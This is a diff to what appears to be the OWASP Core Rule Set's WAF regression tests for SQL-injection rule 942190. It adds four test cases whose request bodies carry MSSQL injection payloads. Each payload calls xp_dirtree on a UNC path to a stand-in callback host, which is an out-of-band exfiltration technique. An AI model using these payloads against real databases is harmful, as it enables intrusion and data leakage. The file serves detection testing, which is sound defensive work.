@@ -637,6 +637,74 @@ tests:
           output:
             log_contains: id "942190"
   - test_title: 942190-38
+    desc: "MSSQL Code Execution and Information gathering attempts"
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Host: localhost
+              User-Agent: OWASP ModSecurity Core Rule Set
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+            method: POST
+            port: 80
+            uri: "/"
+            data: "var=1);declare @q varchar(99);set @q='\\\\j0kwbatxjfgjp0qu3ibonwovamgmkq8h05unittests.corerule' 'set.org\\kph'; exec master.dbo.xp_dirtree @q;--"
+            version: HTTP/1.0
+          output:
+            log_contains: id "942190"
+  - test_title: 942190-39
+    desc: "MSSQL Code Execution and Information gathering attempts"
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Host: localhost
+              User-Agent: OWASP ModSecurity Core Rule Set
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+            method: POST
+            port: 80
+            uri: "/"
+            data: "var=content.ini);declare @q varchar(99);set @q='\\\\i1kvc9uwkehiqzrt4hcnovpublhunittests.corerule' 'set.org\\lri'; exec master.dbo.xp_dirtree @q;--"
+            version: HTTP/1.0
+          output:
+            log_contains: id "942190"
+  - test_title: 942190-40
+    desc: "MSSQL Code Execution and Information gathering attempts"
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Host: localhost
+              User-Agent: OWASP ModSecurity Core Rule Set
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+            method: POST
+            port: 80
+            uri: "/"
+            data: "var=EmptyValue', '4', '2', '7');declare @q varchar(99);set @q='\\\\h5nug8yvodlhuyvs8ggmsuttfklkcjunittests.corerule'+'set.org\\vcr'; exec master.dbo.xp_dirtree @q;--"
+            version: HTTP/1.0
+          output:
+            log_contains: id "942190"
+  - test_title: 942190-41
+    desc: "MSSQL Code Execution and Information gathering attempts"
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Host: localhost
+              User-Agent: OWASP ModSecurity Core Rule Set
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+            method: POST
+            port: 80
+            uri: "/"
+            data: "var=test));declare @q varchar(99);set @q='\\\\zwzc7qpdfvczlgmazy74jckb62cunittests.corrule'+'set.org\\gej'; exec master.dbo.xp_dirtree @q;--"
+            version: HTTP/1.0
+          output:
+            log_contains: id "942190"
+  - test_title: 942190-42
     desc: "MySQL SQLi using set variable"
     stages:
       - stage:
@@ -653,7 +721,7 @@ tests:
             version: HTTP/1.0
           output:
             log_contains: id "942190"
-  - test_title: 942190-39
+  - test_title: 942190-43
     desc: "False positive UNION #2047"
     stages:
       - stage:
@@ -670,7 +738,7 @@ tests:
             version: HTTP/1.0
           output:
             no_log_contains: id "942190"
-  - test_title: 942190-40
+  - test_title: 942190-44
     desc: "MSSQL Logical Functions - IIF (Transact-SQL) - regression test"
     stages:
       - stage:
@@ -687,7 +755,7 @@ tests:
             version: HTTP/1.0
           output:
             log_contains: id "942190"
-  - test_title: 942190-41
+  - test_title: 942190-45
     desc: "False positive IIF"
     stages:
       - stage:
@@ -704,7 +772,7 @@ tests:
             version: HTTP/1.0
           output:
             no_log_contains: id "942190"
-  - test_title: 942190-42
+  - test_title: 942190-46
     desc: "False positive (word boundary)"
     stages:
       - stage:
